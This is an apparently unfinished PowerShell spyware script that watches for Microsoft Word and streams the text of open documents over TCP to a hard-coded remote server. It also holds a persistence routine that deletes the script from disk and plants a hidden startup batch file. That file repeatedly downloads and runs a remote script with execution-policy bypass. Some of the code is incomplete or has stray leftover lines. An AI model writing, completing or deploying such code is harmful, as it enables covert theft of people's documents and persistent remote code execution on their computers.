<#
    TODO:
    - complete StreamText scriptblock
    - server logger (python? each connection to each output text file)
    - clean code, add code comments and finish README (markdown)
#>

<#
.SYNOPSIS

#>


$SERVER = "192.168.237.131"
$LOG_PORT = 8888
$HTTP_PORT = 8000
$TARGET_PROCESS = "WINWORD"

Function Invoke-Persistency {
    <#
    .SYNOPSIS
    
    
    #>

    # self destruction (on disk)
    del $PSScriptRoot 2>$null
    
    "CONSOLESTATE /Hide`npowershell -nop -w 1 -exec bypass -c ""while(1){try{IEX (New-Object Net.WebClient).DownloadString('http://$SERVER`:$HTTP_PORT/script.ps1');exit} catch{sleep 5}}""" > "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
}

Function Wait-ForWord {
    Write-Host "[~] Waiting for Microsoft Word document to be opened" -ForegroundColor Gray
    
    while(1) {
        try {
            $word = ([Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application'))
            Write-Host '[+]' $word.UserName 'opened Word!' -ForegroundColor Green
            break
        }
        catch { sleep 1 }
    }
    return $word
}

function diffstrs {param($a, $b) ($b.ToCharArray() | ?{$a.ToCharArray() -notcontains $_}) -join "" }

$StreamText = {
    <#
    todo:
        - check if this scriptblock works with single doc to remote server
        - complete streamwritter functionality (new lines, backspaces, etc')
            (check about StreamWriter in MSDN)
        - add socket closing properly
    #>
    param($doc, $server, $port)

    # create TCP socket to server
    "trying to connect server"
    while(1) {
        try 
        {
            $socket = New-Object -TypeName System.Net.Sockets.TcpClient
            $socket.Connect($SERVER, $PORT)
            break
        }
        catch 
        {
            sleep 3
        }
    }
    Write-Host "connected"
    # Setup stream writer 
    $Stream = $Socket.GetStream() 
    $Writer = New-Object System.IO.StreamWriter($Stream)
    $Writer.AutoFlush = $true

    $Writer.WriteLine("--------- " + (Get-Date -Format "[MM/dd/yyyy HH:mm]") + " - " + $doc.FullName + " ---------")

    $content = $doc.Range().text
    
    while($new_content = $doc.Range().text) {
        # get diff
        $diff = diffstrs $content $new_content 
        if ($diff) {
            $Writer.Write()
        }
    }


    ($b.ToCharArray() | ?{$a.ToCharArray() -notcontains $_}) -join ""


}

Function Monitor-Word {
    <#
    .SYNOPSIS
    
    #>
    
    $active_docs_count = 0

    while (1) {

        # Wait for Word to be opened
        $word = Wait-ForWord

        # while Word has active documents opened
        while(($word.Documents.Count -gt 0)) {
            # check if new document opened
            if ($word.Documents.Count -gt $active_docs_count) {
                # iterate through all new documents
                for ($i = 1 ; $i -le ($word.Documents.Count - $active_docs_count) ; $i++) {
                    # start streaming job
                    Write-Host '[*] Starting text streaming of ' $word.Documents[$i].Name -ForegroundColor Yellow
                    Start-Job -ScriptBlock $StreamText -ArgumentList ($word.Documents[$i], $SERVER, $LOG_PORT)
                    $active_docs_count += 1
                }
            }
        
            # check if one of the documents has been closed
            if ($word.Documents.Count -lt $active_docs_count) {
                $active_docs_count -= 1
            }

            sleep 1
        }
    }
    
}

#Invoke-Persistency
Monitor-Word